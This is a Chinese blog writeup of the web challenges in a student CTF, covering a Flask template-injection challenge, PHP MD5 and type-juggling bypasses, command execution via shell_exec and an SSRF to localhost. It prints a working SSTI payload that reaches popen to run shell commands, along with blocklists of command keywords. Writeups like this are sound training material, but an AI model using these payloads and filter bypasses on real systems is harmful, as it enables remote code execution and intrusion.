---
title: "第二届CN-fnst::CTF web部分题解"
date: 2024-12-15 14:05
updated: 2024-12-15 14:05
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "PHP"
  - "Python"
description: "新生CTF。基本自己一个人打的（感谢图寻佬给我看了俩题）。差一个misc进前20（一直在做pwn的babyheap_revenge给我调红温了（滚回web了，我再也不学pwn了呜呜呜），没想到misc一个分这么高wok，最后来不及做了嗨） 反馈一下：大量题目是原题。。。osint把取证夺舍了。mis"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18607938"
---
新生CTF。基本自己一个人打的（感谢图寻佬给我看了俩题）。差一个misc进前20（一直在做pwn的babyheap\_revenge给我调红温了（滚回web了，我再也不学pwn了呜呜呜），没想到misc一个分这么高wok，最后来不及做了嗨）

反馈一下：大量题目是原题。。。osint把取证夺舍了。misc把cry夺舍了（真密码题都不难，唯一一个还是强网青少组的原题 数据都没改）。PWN全是原题（泷羽杯的）。re，web，misc算正常。出题风格上偏脑洞。

对于web来说，比较简单。基本都是黑盒题，有一个附件没上（后来上了我没看到wok，所以不写这题wp了（懒懒懒））flag文件都是空的（全在env里？？？）就导致很多题读flag没回显，还以为要提权。

有官方wp。鉴于我跟别人说要周更博客（bushi）还是写一个吧。理论上还是web手，所以就写点web。

# WEB

三个签到，eshili那题有个用户不走waf，伪造就好。math那个题脚本跑烂了没flag。filechecker\_revenge你们看官p吧。没看到后来的附件，大概看了一下好像是phar反序列化。

## ez\_python

![](/images/migrated/18607938/01.png)  
get fuzz，甚至不需要工具。手fuzz就能出file参数  
![](/images/migrated/18607938/02.png)  
读不到/flag。读app.py

```
from flask import Flask, request, render_template_string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import waf

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["300 per day", "75 per hour"])

@app.route('/')
@limiter.exempt
def index():
    file_path = request.args.get('file')
    if file_path and "proc" in file_path:
        return "只过滤了proc，别想用这个了，去读源码", 200
    if file_path:
        try:
            with open(file_path, 'r') as file:
                file_content = file.read()
            return f"{file_content}"
        except Exception as e:
            return f"Error reading file: {e}"
    return "Find the get parameter to read something"

@app.route('/shell')
@limiter.limit("10 per minute")
def shell():
    if request.args.get('name'):
        person = request.args.get('name')
        if not waf.waf_check(person):
            mistake = "Something is banned"
            return mistake
    template = 'Hi, %s' % person
    return render_template_string(template)
some = 'who you are?'
return render_template_string(some)

@app.errorhandler(429)
def ratelimit_error(e):
    return "工具？ 毫无意义，去手搓", 429

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=8000)
```

发现有import waf，读waf.py

```
def waf_check(value):
    dangerous_patterns = ['os', 'set', '__builtins__', '=', '.', '{{', '}}', 'popen', '+', '__']
    for pattern in dangerous_patterns:
        if pattern in value:
            return False
    return True
```

限制了频次不让用fenjing。欸我就偏要用fenjing喵（（（本地起一个服务直接fenjing抛出payload原封不动搬过去就行（（（

这个SSTI过滤约等于没有（绕过方式比我分多）。挑个最简单的request逃逸出了（懒）

```
/shell?name={%25%20print(''[request['args']['a']][request['args']['b']][request['args']['c']]()[132][request['args']['d']][request['args']['f']][request['args']['e']]('whoami')['read']())%20%25}&a=__class__&b=__base__&c=__subclasses__&d=__init__&e=popen&f=__globals__
```

![](/images/migrated/18607938/03.png)

`ls`找flag文件

![](/images/migrated/18607938/04.png)

`cat f1ag_H3re11`出

![](/images/migrated/18607938/05.png)

**flag{0241c8ed-8c99-4ca2-a0b6-54964b569049}**

合格的签到题。

## ezphp

新生题。甚至flag在env里。

```
<?php
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['usn']) && isset($_POST['pwd']) && isset($_GET['usn1']) && isset($_POST['pwd1']) ){
    $usn = $_GET['usn'];
    $usn1 = $_GET['usn1'];
    $pwd = $_POST['pwd'];
    $pwd1 = $_POST['pwd1'];
    if ($usn != $pwd && md5($usn) == md5($pwd)){
        if ($usn1 !== $pwd1 && md5($usn1) === md5($pwd1)){
            $sign = isset($_GET['sign']) && !empty($_GET['sign']) ? $_GET['sign'] : '';
            $forbidden_commands = ['cat', 'tac', 'nl', 'more', 'less', 'head', 'tail', 'read'];
            $sign_lower = strtolower($sign);
            foreach ($forbidden_commands as $forbidden) {
                if (strpos($sign_lower, $forbidden) !== false) {
                    die('lol');
                }
            }
            if (empty($sign)) {
                die('lol');
            }
            try {
                $output = shell_exec(escapeshellcmd($sign));
                echo "<pre>$output</pre>";
            } catch (ValueError $e) {
                echo "lol";
            }
        }
        else{
            echo "lol";
        }
    }
    else {
        echo "lol";
    }

}
else {
    echo 'lol';
}
?>
```

usn和pwd那俩一看就是数组绕。后面一个RCE。

![](/images/migrated/18607938/06.png)

**flag{a2059a27-c817-4b9a-96d6-c3faef3c2d2a}**

这里跟新生说一句：这里如果真要读文件也是绕过的方法比我分多。nl, sort啥的都可以。

## comment\_me

依然是签到难度。WEB题虽然说唐了点，但还是很照顾新生的。就是这里SSTI考点重复了。而且过滤更少了。。。

![](/images/migrated/18607938/07.png)

找到/modify。post发个包看看。

![](/images/migrated/18607938/08.png)

回到主页

![](/images/migrated/18607938/09.png)

fuzz，发现只过滤了点号。。。剩下的不解释了喵。直接快进到难题吧（flag在env里不在同目录文件里，你没读出来不是你的问题）

![](/images/migrated/18607938/10.png)

出flag

![](/images/migrated/18607938/11.png)

**flag{aeab73b2-5abf-4f5d-a223-84fbb72ad401}**

## i\_am\_eeeeeshili

估计前几道题也没几个人看。欸我说你是直接点到这题来的吧（（（是吧是吧

注册登录，看cookie（底下的base64有fake flag）

![](/images/migrated/18607938/12.png)

发现有admin账号和eeeeeshili账号（这里有点脑洞）（注册不了）。

这个qwer很可疑。删掉之后就会直接未认证回到登陆界面。在这里充当密钥的角色。而且每一次登录账号qwer还不一样。

登录，抓包。看到：

![](/images/migrated/18607938/13.png)

修改file，看到出题人的waf提示（人还怪好的，没得喷）

![](/images/migrated/18607938/14.png)

读取/flag

![](/images/migrated/18607938/15.png)

看到

![](/images/migrated/18607938/16.png)

需要一个包含的洞（str\_replace了\_\_FILE\_\_中路径穿越可能用到的字符之后不能与当前脚本名相等）想到SSRF

抓包。看到setsession.php。POST参数为message。GET stream看到回显。

综上。尝试打ssrf

![](/images/migrated/18607938/17.png)

居然一点过滤都没有我勒个

![](/images/migrated/18607938/18.png)

修改eeeeeshili账号密码。（试过修改admin账号的密码。发现登进去是一样的）

![](/images/migrated/18607938/19.png)

base64解码。

```
$client_ip = $_SERVER["REMOTE_ADDR"];
$server_ip = $_SERVER["SERVER_ADDR"];
if ($client_ip === $server_ip) {
    if ($_GET["KAF"] !== "1a" && (int)$_GET["KAF"] == "1a"){
        ...
    }
} else {
    echo 'xxx'
    echo '<script>alert("坏蛋改不了一点密码！");</script>';
    die();
}
```

弱类型比较。KAF=1即可。

![](/images/migrated/18607938/20.png)

php特性打就行了

```
check_http://127.0.0.1/check.php?file=./flag&a[]=1&b[]=2&c[]=1&d[]=2&e=2000864773
```

小声ps：整个比赛的MD5绕过貌似都可以用数组绕，下次检查一下类型啊喂

![](/images/migrated/18607938/21.png)

加QQ要flag
